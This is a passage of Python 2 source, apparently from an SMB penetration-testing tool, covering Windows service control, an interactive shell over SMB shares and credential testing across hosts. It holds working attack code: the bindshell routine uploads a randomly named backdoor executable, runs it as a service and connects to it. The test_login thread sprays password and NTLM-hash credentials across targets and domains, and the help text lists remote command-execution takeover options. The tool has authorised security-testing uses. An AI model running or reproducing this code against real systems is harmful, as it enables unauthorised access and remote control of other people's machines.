        print 'DEPENDENCIES      : %s' % resp['QueryConfig']['Dependencies'].decode('utf-16le').replace('/',' - ')
        print 'SERVICE_START_NAME: %s' % resp['QueryConfig']['ServiceStartName'].decode('utf-16le')

    def __svcctl_parse_status(self, status):
        if status == svcctl.SERVICE_CONTINUE_PENDING:
           return 'CONTINUE PENDING'
        elif status == svcctl.SERVICE_PAUSE_PENDING:
           return 'PAUSE PENDING'
        elif status == svcctl.SERVICE_PAUSED:
           return 'PAUSED'
        elif status == svcctl.SERVICE_RUNNING:
           return 'RUNNING'
        elif status == svcctl.SERVICE_START_PENDING:
           return 'START PENDING'
        elif status == svcctl.SERVICE_STOP_PENDING:
           return 'STOP PENDING'
        elif status == svcctl.SERVICE_STOPPED:
           return 'STOPPED'
        else:
           return 'UNKOWN'

    def __svcctl_status(self, srvname, return_status=False):
        '''
        Display status of a service
        '''
        logger.info('Querying the status of service %s' % srvname)

        ans = self.__svc.QueryServiceStatus(self.__svc_handle)
        status = ans['CurrentState']

        if return_status:
            return self.__svcctl_parse_status(status)
        else:
            print 'Service %s status is: %s' % (srvname, self.__svcctl_parse_status(status))

    def __svcctl_config(self, srvname):
        '''
        Display a service configuration
        '''
        logger.info('Querying the service configuration of service %s' % srvname)

        print 'Service %s information:' % srvname

        resp = self.__svc.QueryServiceConfigW(self.__svc_handle)
        self.__svcctl_parse_config(resp)

    def __svcctl_start(self, srvname, srvargs=''):
        '''
        Start the service
        '''
        logger.info('Starting the service %s' % srvname)

        if not srvargs:
            srvargs = []
        else:
            new_srvargs = []

            for arg in str(srvargs).split(' '):
                new_srvargs.append(arg.encode('utf-16le'))

            srvargs = new_srvargs

        self.__svc.StartServiceW(self.__svc_handle, srvargs)
        self.__svcctl_status(srvname)

    def __svcctl_stop(self, srvname):
        '''
        Stop the service
        '''
        logger.info('Stopping the service %s' % srvname)

        self.__svc.StopService(self.__svc_handle)
        self.__svcctl_status(srvname)

    def __svcctl_change(self, srvname):
        '''
        Change the configuration of a service
        '''
        # TODO
        self.__svc.ChangeServiceConfigW(self.__svc_handle, display, path, service_type, start_type, start_name, password)

    def __svcctl_list_parse(self, srvname, resp):
        '''
        Parse list of services
        '''
        services = []

        for i in range(len(resp)):
            name = resp[i]['ServiceName'].decode('utf-16')
            display = resp[i]['DisplayName'].decode('utf-16')
            state = resp[i]['CurrentState']

            if srvname:
                srvname = srvname.strip('*')

                if srvname.lower() not in display.lower() and srvname.lower() not in name.lower():
                    continue

            services.append((display, name, state))

        services.sort()

        for service in services:
            print '%s (%s): %-80s' % (service[0], service[1], self.__svcctl_parse_status(service[2]))

        return len(services)

    def __svcctl_list(self, srvname):
        '''
        List services
        '''
        logger.info('Listing services')

        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_SHARE_PROCESS)
        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS)
        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_FILE_SYSTEM_DRIVER)
        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_INTERACTIVE_PROCESS)
        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS | svcctl.SERVICE_WIN32_SHARE_PROCESS | svcctl.SERVICE_INTERACTIVE_PROCESS, serviceState=svcctl.SERVICE_STATE_ALL)
        resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceState=svcctl.SERVICE_STATE_ALL)
        num = self.__svcctl_list_parse(srvname, resp)

        print '\nTotal services: %d\n' % num

#######################
# SMBShell main class #
#######################
class SMBShell(SvcCtl, Samr, AtSvc):
    def __init__(self, target, credential, execute_commands=None):
        self.__target = target
        self.__dstip = self.__target.getHost()
        self.__dstport = self.__target.getPort()

        self.smb = None
        self.__user = credential.getUser()
        self.__password = credential.getPassword()
        self.__lmhash = credential.getLMhash()
        self.__nthash = credential.getNThash()
        self.__domain = credential.getDomain()

        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
        self.__srcfile = conf.name

        self.__timeout = 3

        self.tid = None
        self.pwd = '\\'
        self.share = ''
        self.shares_list = []
        self.domains_dict = {}
        self.users_list = set()
        self.completion = []

        self.connect()
        logger.debug('Connection to host %s established' % self.__target.getIdentity())
        self.login()
        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))

    def connect(self):
        '''
        Connect the SMB session
        '''
        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)

    def login(self):
        '''
        Login over the SMB session
        '''
        try:
            self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.error('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def logoff(self):
        self.smb.logoff()

    def smb_transport(self, named_pipe):
        '''
        Initiate a SMB connection on a specific named pipe
        '''
        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe, smb_connection=self.smb)

        try:
            self.trans.connect()
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.warn('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def check_share(self, share=None):
        if share:
            self.use(share)
        elif not share and (self.share is None or self.tid is None):
            logger.warn('Share has not been specified, select one')
            self.shares()

    def info(self):
        logger.debug('Binding on Server Service (SRVSVC) interface')
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
        self.__resp = self.__svc.get_server_info_102(self.trans.get_dip())
        self.__dce.disconnect()

        print 'Operating system: %s' % self.smb.getServerOS()
        print 'Netbios name: %s' % self.smb.getServerName()
        print 'Domain: %s' % self.smb.getServerDomain()
        print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
        print 'NTLMv2 support: %s' % self.smb.doesSupportNTLMv2()
        print 'UserPath: %s' % self.__resp['UserPath']
        print 'Simultaneous users: %d' % self.__resp['Users']
        print 'Version major: %d' % self.__resp['VersionMajor']
        print 'Version minor: %d' % self.__resp['VersionMinor']
        print 'Comment: %s' % self.__resp['Comment'] or ''

        # TODO: uncomment when SMBConnection will have a wrapper
        # getServerTime() method for both SMBv1,2,3
        #print 'Time: %s' % self.smb.get_server_time()

    def who(self):
        logger.debug('Binding on Server Service (SRVSVC) interface')
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
        resp = self.__svc.NetrSessionEnum()

        for session in resp:
            print "host: %15s, user: %5s, active: %5d, idle: %5d, type: %5s, transport: %s" % (session['HostName'].decode('utf-16le')[:-1], session['UserName'].decode('utf-16le')[:-1], session['Active'], session['IDLE'], session['Type'].decode('utf-16le')[:-1],session['Transport'].decode('utf-16le')[:-1] )

    def shares(self):
        self.__resp = self.smb.listShares()
        count = 0

        for i in range(len(self.__resp)):
            name = self.__resp[i]['NetName'].decode('utf-16')
            comment = self.__resp[i]['Remark'].decode('utf-16')
            count += 1
            self.shares_list.append(name)

            print '[%d] %s (comment: %s)' % (count, name, comment)

        msg = 'Which share do you want to connect to? (default: 1) '
        limit = len(self.shares_list)
        choice = read_input(msg, limit)

        self.use(self.shares_list[choice-1])

    def use(self, share):
        if not share:
            raise missingShare, 'Share has not been specified'

        if self.tid:
            self.smb.disconnectTree(self.tid)

        self.share = share.strip('\x00')
        self.tid = self.smb.connectTree(self.share)
        self.pwd = '\\'
        self.ls('', False)

    def cd(self, path):
        if not path:
            return

        p = replace(path)
        self.__oldpwd = self.pwd

        if path == '.':
            return
        elif path == '..':
            sep = self.pwd.split('\\')
            self.pwd = ''.join('\\%s' % s for s in sep[:-1])
            return

        if p[0] == '\\':
           self.pwd = path
        else:
           self.pwd = ntpath.join(self.pwd, path)

        self.pwd = ntpath.normpath(self.pwd)

        # Let's try to open the directory to see if it's valid
        try:
            fid = self.smb.openFile(self.tid, self.pwd)
            self.smb.closeFile(self.tid, fid)
            logger.warn('File is not a directory')
            self.pwd = self.__oldpwd
        except SessionError, e:
            if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
               pass
            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                logger.warn('Access denied')
                self.pwd = self.__oldpwd
            elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
                logger.warn('File not found')
                self.pwd = self.__oldpwd
            else:
                logger.warn('SMB error: %s' % (e.getErrorString(), ))
                self.pwd = self.__oldpwd

    def get_pwd(self):
        print ntpath.join(self.share, self.pwd)

    def ls(self, path, display=True):
        self.check_share()

        if not path:
            pwd = ntpath.join(self.pwd, '*')
        else:
           pwd = ntpath.join(self.pwd, path)

        self.completion = []
        pwd = replace(pwd)
        pwd = ntpath.normpath(pwd)

        for f in self.smb.listPath(self.share, pwd):
            if display is True:
                print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())

            self.completion.append((f.get_longname(),f.is_directory()))

    def cat(self, filename):
        self.check_share()
        filename = ntpath.join(self.pwd, replace(filename))
        self.ls(filename, display=False)

        for identified_file, is_directory in self.completion:
            if is_directory > 0:
                continue

            logger.debug('Reading file %s...' % identified_file)

            try:
                self.fid = self.smb.openFile(self.tid, identified_file)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                else:
                    logger.error('SMB error: %s' % (e.getErrorString(), ))

                continue

            offset = 0

            while 1:
                try:
                    data = self.smb.readFile(self.tid, self.fid, offset)
                    print data

                    if len(data) == 0:
                        break

                    offset += len(data)
                except SessionError, e:
                    if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
                        break
                    else:
                        logger.error('SMB error: %s' % (e.getErrorString(), ))

            self.smb.closeFile(self.tid, self.fid)

    def download(self, filename):
        self.check_share()
        filename = os.path.basename(filename)
        self.ls(filename, display=False)

        for identified_file, is_directory in self.completion:
            if is_directory > 0:
                continue

            logger.debug('Downloading file %s...' % identified_file)

            try:
                fh = open(identified_file, 'wb')
                identified_file = ntpath.join(self.pwd, replace(identified_file))
                self.smb.getFile(self.share, identified_file, fh.write)
                fh.close()
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('SMB error: %s' % (e.getErrorString(), ))
                continue

    def upload(self, pathname, destfile=None):
        try:
            fp = open(pathname, 'rb')
        except IOError:
            logger.error('Unable to open file %s' % pathname)
            return False

        self.check_share()

        if not destfile:
            destfile = os.path.basename(pathname)
            destfile = ntpath.join(self.pwd, replace(destfile))

        self.smb.putFile(self.share, destfile, fp.read)
        fp.close()

    def rename(self, srcfile, destfile=None):
        self.check_share()
        srcfile = ntpath.join(self.pwd, replace(srcfile))
        destfile = ntpath.join(self.pwd, replace(destfile))
        self.smb.rename(self.share, srcfile, destfile)

    def mkdir(self, path):
        self.check_share()
        path = ntpath.join(self.pwd, replace(path))
        self.smb.createDirectory(self.share, path)

    def rm(self, filename):
        self.check_share()
        filename = ntpath.join(self.pwd, replace(filename))
        self.smb.deleteFile(self.share, filename)

    def rmdir(self, path):
        self.check_share()
        path = ntpath.join(self.pwd, replace(path))
        self.smb.deleteDirectory(self.share, path)

    def bindshell(self, port):
        connected = False
        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])

        if not port:
            port = 4445
        elif not isinstance(port, int):
            port = int(port)

        if not os.path.exists(local_file):
            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'

        self.deploy(srvname, local_file, port, remote_file)

        logger.info('Connecting to backdoor on port %d, wait..' % port)

        for counter in xrange(0, 3):
            try:
                time.sleep(1)

                if str(sys.version.split()[0]) >= '2.6':
                    tn = Telnet(self.__dstip, port, 3)
                else:
                    tn = Telnet(self.__dstip, port)

                connected = True
                tn.interact()
            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
                if connected is False:
                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])

                    if counter < 2:
                        warn_msg += ', retrying..'
                        logger.warn(warn_msg)
                    else:
                        logger.error(warn_msg)
            except SessionError, e:
                #traceback.print_exc()
                logger.error('SMB error: %s' % (e.getErrorString(), ))
            except KeyboardInterrupt, _:
                print
                logger.info('User aborted')
            except Exception, e:
                #traceback.print_exc()
                logger.error(str(e))

            if connected is True:
                tn.close()
                sys.stdout.flush()
                break

        time.sleep(1)
        self.undeploy(srvname)

class InteractiveShell(cmd.Cmd):
    def __init__(self, target, credential, execute_commands=None):
        '''
        Initialize the object variables
        '''

        cmd.Cmd.__init__(self)

        self.smb_shell = SMBShell(target, credential, execute_commands)
        logger.info('Launching interactive SMB shell')
        self.prompt = '# '

        print 'Type help for list of commands'

    def cmdloop(self):
        while True:
            try:
                cmd.Cmd.cmdloop(self)
            except SessionError, e:
                #traceback.print_exc()
                logger.error('SMB error: %s' % (e.getErrorString(), ))
            except keimpxError, e:
                logger.error(e)
            except KeyboardInterrupt, _:
                print
                logger.info('User aborted')
                self.do_exit('')
            except Exception, e:
                #traceback.print_exc()
                logger.error(str(e))

    def emptyline(self):
        pass

    def complete_files(self, text, line, begidx, endidx, include=1):
        # include means
        # 0 all files and directories
        # 1 just files
        # 2 just directories
        p = string.replace(line, '/', '\\')

        if p.find('\\') < 0:
            items = []

            if include == 1:
                mask = 0
            else:
                mask = 0x010

            for i in self.smb_shell.completion:
                if i[1] == mask or include == 0:
                    items.append(i[0])

            if text:
                return [item for item in items if item.upper().startswith(text.upper())]
            else:
                return items

    def do_shell(self, cmd):
        '''
        Execute a local command if the provided command is preceed by an
        exclamation mark
        '''
        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        stdout, _ = process.communicate()

        if stdout is not None:
            print stdout

    def do_exit(self, line):
        '''
        Disconnect the SMB session
        '''
        self.smb_shell.logoff()
        sys.exit(0)

    def do_help(self, line):
        '''
        Show the help menu
        '''
        print '''Generic options
===============
help - show this message
verbosity {level} - set verbosity level (0-2)
info - returns NetrServerInfo main results
who - returns the sessions currently connected at the target host (admin required)
exit - terminates the SMB session and exit from the tool
!{command} - execute a local command

Shares options
==============
shares - list available shares
use {share} - connect to an specific share
cd {path} - changes the current directory to {path}
pwd - shows current remote directory
ls {path} - lists all the files in the current directory
cat {file} - display content of the selected file
download {filename} - downloads the filename from the current path
upload {filename} [destfile] - uploads the filename into a remote share (or current path)
rename {srcfile} {destfile} - rename a file
mkdir {dirname} - creates the directory under the current path
rm {file} - removes the selected file
rmdir {dirname} - removes the directory under the current path

Services options
================
services [service name] - list services
status {service name} - query the status of a service
query {service name} - list the configuration of a service
start {service name} - start a service
stop {service name} - stop a service
change {service name} - change the configuration of a service (in progress)
deploy {service name} {local file} [service args] [remote file] [displayname] - deploy remotely a service executable
undeploy {service name} - undeploy remotely a service executable

Users options
=============
users [domain] - list users, optionally for a specific domain
pswpolicy [domain] - list password policy, optionally for a specific domain
domains - list domains to which the system is part of

Registry options (Soon)
================
regread {registry key} - read a registry key
regwrite {registry key} {registry value} - add a value to a registry key
regdelete {registry key} - delete a registry key

Take-over options
=================
bindshell [port] - spawn a shell listening on a TCP port on the target
      This works by upload a custom bind shell, executing it as a service
      and connecting to a TCP port where it listens, by default 4445/TCP.
      If the target is behind a strict firewall it may not work.
svcshell [mode] - semi-interactive shell through a custom Windows Service
      This works by creating a service to execute a command, redirect its
      output to a temporary file within a share and retrieving its content,
      then deleting the service.
      Mode of operation can be SHARE (default) or SERVER whereby a local
      SMB server is instantiated to receive the output of the commands. This
      is useful in the situation where the target machine does not have a
      writeable share available - no extra ports are required.
atexec {command} - executes a command through the Task Scheduler service
      Returns the output of such command. No interactive shell, one command
      at a time - no extra ports are required.
psexec [command] - executes a command through SMB named pipes (in progress)
      Same technique employed by Sysinternal's PsExec. The default command
      is cmd.exe therefore an interactive shell is established. It employs
      RemComSvc - no extra ports are required.
'''

    def do_verbosity(self, level):
        set_verbosity(level)

    def do_info(self, line):
        '''
        Display system information like operating system
        '''
        self.smb_shell.info()

    def do_who(self, line):
        '''
        Display the sessions currently connected at the target host (admin required)
        '''
        self.smb_shell.who()

    def do_shares(self, line):
        '''
        List available shares and display a menu to select which share to
        connect to
        '''
        self.smb_shell.shares()

    def do_use(self, share):
        '''
        Select the share to connect to
        '''
        self.smb_shell.use(share)

    def complete_cd(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=2)

    def do_cd(self, path):
        '''
        Change the current path
        '''
        self.smb_shell.cd(path)

    def do_pwd(self, line):
        '''
        Display the current path
        '''
        self.smb_shell.get_pwd()

    def do_dir(self, path):
        '''
        Alias to ls
        '''
        self.do_ls(path)

    def do_ls(self, path, display=True):
        '''
        List files from the current path
        '''
        self.smb_shell.ls(path, display)

    def complete_cat(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=1)

    def do_cat(self, filename):
        '''
        Display a file content from the current path
        '''
        self.smb_shell.cat(filename)

    def complete_get(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=1)

    def do_get(self, filename):
        '''
        Alias to download
        '''
        self.do_download(filename)

    def complete_download(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=1)

    def do_download(self, filename):
        '''
        Download a file from the current path
        '''
        self.smb_shell.download(filename)

    def do_put(self, pathname, destfile=None):
        '''
        Alias to upload
        '''
        self.do_upload(pathname, destfile)

    def do_upload(self, pathname, destfile=None):
        '''
        Upload a file in the current path
        '''
        if not destfile:
            argvalues = shlex.split(pathname)

            if len(argvalues) < 1:
                raise missingOption, 'You have to specify at least the local file name'
            elif len(argvalues) > 1:
                destfile = argvalues[1]

            pathname = argvalues[0]

        self.smb_shell.upload(pathname, destfile)

    def do_mv(self, srcfile, destfile=None):
        '''
        Alias to rename
        '''
        self.do_rename(srcfile, destfile)

    def do_rename(self, srcfile, destfile=None):
        '''
        Rename a file
        '''
        if not destfile:
            argvalues = shlex.split(srcfile)

            if len(argvalues) != 2:
                raise missingOption, 'You have to specify source and destination file names'
            else:
                srcfile, destfile = argvalues
                
        self.smb_shell.rename(srcfile, destfile)

    def do_mkdir(self, path):
        '''
        Create a directory in the current share
        '''
        self.smb_shell.mkdir(path)

    def complete_rm(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=1)

    def do_rm(self, filename):
        '''
        Remove a file in the current share
        '''
        self.smb_shell.rm(filename)

    def complete_rmdir(self, text, line, begidx, endidx):
        return self.complete_files(text, line, begidx, endidx, include=2)

    def do_rmdir(self, path):
        '''
        Remove a directory in the current share
        '''
        self.smb_shell.rmdir(path)

    def do_services(self, srvname):
        self.smb_shell.services(srvname)

    def do_status(self, srvname):
        if not srvname:
            raise missingService, 'Service name has not been specified'

        self.smb_shell.status(srvname)

    def do_query(self, srvname):
        if not srvname:
            raise missingService, 'Service name has not been specified'

        self.smb_shell.query(srvname)

    def do_start(self, srvname, srvargs=''):
        '''
        Start a service.
        '''
        if not srvargs:
            argvalues = shlex.split(srvname)

            if len(argvalues) < 1:
                raise missingService, 'Service name has not been specified'
            elif len(argvalues) > 1:
                srvargs = argvalues[1]

            srvname = argvalues[0]

        self.smb_shell.start(srvname, srvargs)

    def do_stop(self, srvname):
        '''
        Stop a service.
        '''
        if not srvname:
            raise missingService, 'Service name has not been specified'

        self.smb_shell.stop(srvname)

    def do_change(self, srvname):
        '''
        Change the configuration of a service.
        '''
        if not srvname:
            raise missingService, 'Service name has not been specified'

        self.smb_shell.change(srvname)

    def do_deploy(self, srvname, local_file=None, srvargs='', remote_file=None, displayname=None):
        '''
        Deploy a Windows service: upload the service executable to the
        file system, create a service as 'Automatic' and start it

        Sample command:
        deploy shortname contrib/srv_bindshell.exe 5438 remotefile.exe 'long name'
        '''
        argvalues = shlex.split(srvname)

        if len(argvalues) < 1:
            raise missingService, 'Service name has not been specified'

        srvname = argvalues[0]

        if not local_file:
            if len(argvalues) < 2:
                raise missingFile, 'Service file %s has not been specified' % local_file
            if len(argvalues) >= 5:
                displayname = argvalues[4]
            if len(argvalues) >= 4:
                remote_file = argvalues[3]
            if len(argvalues) >= 3:
                srvargs = argvalues[2]
            if len(argvalues) >= 2:
                local_file = argvalues[1]

        if not os.path.exists(local_file):
            raise missingFile, 'Service file %s does not exist' % local_file

        srvname = str(srvname)
        srvargs = str(srvargs)

        if not remote_file:
            remote_file = str(os.path.basename(local_file.replace('\\', '/')))
        else:
            remote_file = str(os.path.basename(remote_file.replace('\\', '/')))

        if not displayname:
            displayname = srvname
        else:
            displayname = str(displayname)

        self.smb_shell.deploy(srvname, local_file, srvargs, remote_file, displayname)

    def do_undeploy(self, srvname):
        '''
        Wrapper method to undeploy a Windows service. It stops the
        services, removes it and removes the executable from the file
        system
        '''
        if not srvname:
            raise missingService, 'Service name has not been specified'

        self.smb_shell.undeploy(srvname)

    def do_users(self, usrdomain):
        '''
        List users, optionally for a specific domain
        '''
        self.smb_shell.users(usrdomain)

    def do_pswpolicy(self, usrdomain):
        '''
        List password policy, optionally for a specific domain
        '''
        self.smb_shell.pswpolicy(usrdomain)

    def do_domains(self, line):
        '''
        List domains to which the system is part of
        '''
        self.smb_shell.domains()

    def do_bindshell(self, port):
        '''
        Spawn a shell listening on a TCP port on the target
        '''
        self.smb_shell.bindshell(port)

    def do_svcshell(self, mode='SHARE'):
        '''
        Semi-interactive shell through a custom Windows Service
        '''
        self.smb_shell.svcshell(mode)

    def do_atexec(self, command):
        '''
        Executes a command through the Task Scheduler service
        '''
        if not command:
            raise missingOption, 'Command has not been specified'

        self.smb_shell.atexec(command)

    def do_psexec(self, command):
        '''
        Executes a command through SMB named pipes
        '''
        logger.warn('Command not yet implemented')

class test_login(Thread):
    def __init__(self, target):
        Thread.__init__(self)

        self.__target = target
        self.__dstip = self.__target.getHost()
        self.__dstport = self.__target.getPort()
        self.__target_id = self.__target.getIdentity()
        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
        self.__srcfile = conf.name
        self.__timeout = 3

    def connect(self):
        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)

    def login(self, user, password, lmhash, nthash, domain):
        self.smb.login(user, password, domain, lmhash, nthash)

    def logoff(self):
        self.smb.logoff()

    def run(self):
        global pool_thread
        global successes

        try:
            logger.info('Assessing host %s' % self.__target_id)

            for credential in credentials:
                user, password, lmhash, nthash = credential.getCredentials()

                if password != '' or ( password == '' and lmhash == '' and nthash == ''):
                    password_str = password or 'BLANK'
                elif lmhash != '' and nthash != '':
                    password_str = '%s:%s' % (lmhash, nthash)

                for domain in domains:
                    status = False
                    error_code = None

                    if domain:
                        user_str = '%s\%s' % (domain, user)
                    else:
                        user_str = user

                    try:
                        self.connect()
                        self.login(user, password, lmhash, nthash, domain)
                        self.logoff()

                        if self.smb.isGuestSession() > 0:
                            logger.warn('%s allows guest sessions with any credentials, skipping further login attempts' % self.__target_id)
                            return
                        else:
                            if self.smb.getServerDomain().upper() != domain.upper() and self.smb.getServerName().upper() != domain.upper():
                                domain = ''
                                user_str = user

                            logger.info('Successful login for %s with %s on %s' % (user_str, password_str, self.__target_id))

                        status = True
                        successes += 1
                    except SessionError, e:
                        logger.debug('Failed login for %s with %s on %s %s' % (user_str, password_str, self.__target_id, e.getErrorString()))
                        error_code = e.getErrorCode()

                    credential.addTarget(self.__dstip, self.__dstport, domain, status, error_code)
                    self.__target.addCredential(user, password, lmhash, nthash, domain, status, error_code)

                    if status is True:
                        break

            logger.info('Assessment on host %s finished' % self.__target.getIdentity())

        except (socket.error, socket.herror, socket.gaierror, socket.timeout, NetBIOSTimeout), e:
            logger.warn('Connection to host %s failed (%s)' % (self.__target.getIdentity(), str(e)))

        pool_thread.release()

class CredentialsTarget:
    def __init__(self, host, port, domain, status, error_code):
        self.host = host
        self.port = port
        self.domain = domain
        self.status = status
        self.error_code = error_code

    def getHost(self):
        return self.host

    def getPort(self):
        return self.port

    def getStatus(self):
        return self.status

    def getIdentity(self):
        if self.domain:
            return '%s:%s@%s' % (self.host, self.port, self.domain)
        else:
            return '%s:%s' % (self.host, self.port)

class Credentials:
    def __init__(self, user, password='', lmhash='', nthash=''):
        self.user = user
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash

        # All targets where these credentials pair have been tested
        # List of CredentialsTarget() objects
        self.tested_targets = []

    def getUser(self):
        return self.user

    def getPassword(self):
        return self.password

    def getLMhash(self):
        return self.lmhash

    def getNThash(self):
        return self.nthash

    def getIdentity(self):
        if self.lmhash != '' and self.nthash != '':
            return '%s/%s:%s' % (self.user, self.lmhash, self.nthash)
        else:
            return '%s/%s' % (self.user, self.password or 'BLANK')

    def getCredentials(self):
        if self.lmhash != '' and self.nthash != '':
            return self.user, self.password, self.lmhash, self.nthash
        else:
            return self.user, self.password, '', ''

    def addTarget(self, host, port, domain, status, error_code):
        self.tested_targets.append(CredentialsTarget(host, port, domain, status, error_code))

    def getTargets(self, valid_only=False):
        _ = []

        for tested_target in self.tested_targets:
            if (valid_only and tested_target.getStatus() is True) \
                or not valid_only:
                _.append(tested_target)

        return _

    def getValidTargets(self):
        return self.getTargets(True)

class TargetCredentials:
    def __init__(self, user, password, lmhash, nthash, domain, status, error_code):
        self.user = user
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.domain = domain
        self.status = status
        self.error_code = error_code

    def getUser(self):
        return self.user

    def getPassword(self):
        return self.password

    def getLMhash(self):
        return self.lmhash

    def getNThash(self):
        return self.nthash    

    def getDomain(self):
        return self.domain

    def getStatus(self):
        return self.status

    def getIdentity(self):
        if self.domain:
            _ = '%s\%s' % (self.domain, self.user)
        else:
            _ = self.user

        if self.lmhash != '' and self.nthash != '':
            return '%s/%s:%s' % (_, self.lmhash, self.nthash)
        else:
            return '%s/%s' % (_, self.password or 'BLANK')

class Target:
    def __init__(self, target, port):
        self.target = target
        self.port = int(port)

        # All credentials tested on this target
        # List of TargetCredentials() objects
        self.tested_credentials = []

    def getHost(self):
        return self.target

    def getPort(self):
        return self.port

    def getIdentity(self):
        return '%s:%d' % (self.target, self.port)

    def addCredential(self, user, password, lmhash, nthash, domain, status, error_code):
        self.tested_credentials.append(TargetCredentials(user, password, lmhash, nthash, domain, status, error_code))

    def getCredentials(self, valid_only=False):
        _ = []

        for tested_credential in self.tested_credentials:
            if (valid_only and tested_credential.getStatus() is True) \
                or not valid_only:
                _.append(tested_credential)

        return _

    def getValidCredentials(self):
        return self.getCredentials(True)

def read_input(msg, counter):
    while True:
        choice = raw_input(msg)

        if choice == '':
            choice = 1
            break
        elif choice.isdigit() and int(choice) >= 1 and int(choice) <= counter:
            choice = int(choice)
            break
        else:
            logger.warn('The choice must be a digit between 1 and %d' % counter)

    return choice

def remove_comments(lines):
    cleaned_lines = []

    for line in lines:
        # Ignore comment lines and blank ones
        if line.find('#') == 0 or line.isspace() or len(line) == 0:
            continue

        cleaned_lines.append(line)

    return cleaned_lines

def add_execute(cmd):
    global execute_commands

    #if cmd is not None and len(cmd) > 0 and cmd not in execute_commands:
    if cmd is not None and len(cmd) > 0:
        execute_commands.append(cmd)

def parse_executelist_file():
    try:
        fp = open(conf.executelist, 'r')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open list of commands file %s' % conf.executelist)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_execute(line)

def executelist():
    parse_executelist_file()

    targets_tuple = ()

    for target in targets:
        valid_credentials = target.getValidCredentials()

        logger.info('Executing commands on %s' % target.getIdentity())

        if len(valid_credentials):
            first_credentials = valid_credentials[0]

        try:
            shell = InteractiveShell(target, first_credentials, execute_commands)
            shell.cmdloop()
        except RuntimeError:
            sys.exit(255)

###############
# Set domains #
###############
def parse_domains_file(filename):
    try:
        fp = open(filename, 'rb')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open domains file %s' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_domain(line)

def add_domain(line):
    global domains

    _ = str(line).replace(' ', '').split(',')
    domains.extend(_)

    logger.debug('Parsed domain%s: %s' % ('(s)' if len(_) > 1 else '', ', '.join([d for d in _])))

def set_domains():
    global domains

    logger.info('Loading domains')

    if conf.domain is not None:
        logger.debug('Loading domains from command line')
        add_domain(conf.domain)

    if conf.domainsfile is not None:
        logger.debug('Loading domains from file %s' % conf.domainsfile)
        parse_domains_file(conf.domainsfile)

    domains = list(set(domains))

    if len(domains) == 0:
        logger.info('No domains specified, using a blank domain')
        domains.append('')
    elif len(domains) > 0:
        if '' not in domains:
            domains.append('')
        logger.info('Loaded %s unique domain%s' % (len(domains), 's' if len(domains) > 1 else ''))

###################
# Set credentials #
###################
def parse_credentials_file(filename):
    try:
        fp = open(filename, 'rb')
        file_lines = fp.read().splitlines()
        fp.close()

